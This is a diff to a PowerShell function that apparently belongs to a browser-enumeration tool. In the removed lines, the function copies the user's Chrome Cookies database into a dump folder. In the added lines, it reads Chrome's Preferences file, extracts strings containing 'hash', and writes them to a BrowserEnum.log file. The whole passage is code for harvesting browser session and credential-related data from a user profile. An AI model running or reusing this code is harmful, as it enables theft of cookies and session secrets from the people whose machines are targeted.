@@ -283,14 +283,17 @@ function CHROME {
       echo "Could not find any Chrome Bookmarks .." >> $LogFilePath\BrowserEnum.log
   }
 
-  ## Retrieve CHrome Cookies
-  $Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+  ## Retrieve Chrome Cookies (hashs)
+  $Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
   $check_path = Test-Path -Path $Path
   If($check_path -eq $True){
       echo "`nChrome Cookies" >> $LogFilePath\BrowserEnum.log
       echo "--------------" >> $LogFilePath\BrowserEnum.log
-      echo "Dump       : $LogFilePath\cookies" >> $LogFilePath\BrowserEnum.log
-      Copy-Item -Path $Path -Destination $LogFilePath\cookies
+      $Store_Path = Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
+      $Parse_String = $Store_Path.split(",");$Find_MyHash = $Parse_String|Select-String "hash"
+      $BadChars = $Find_MyHash -replace '"setting":{"hasHighScore":false',''
+      $Dump = $BadChars|where-object {$_}
+      echo "$Dump" >> $LogFilePath\BrowserEnum.log
   }else{
       echo "`nChrome Cookies" >> $LogFilePath\BrowserEnum.log
       echo "--------------" >> $LogFilePath\BrowserEnum.log
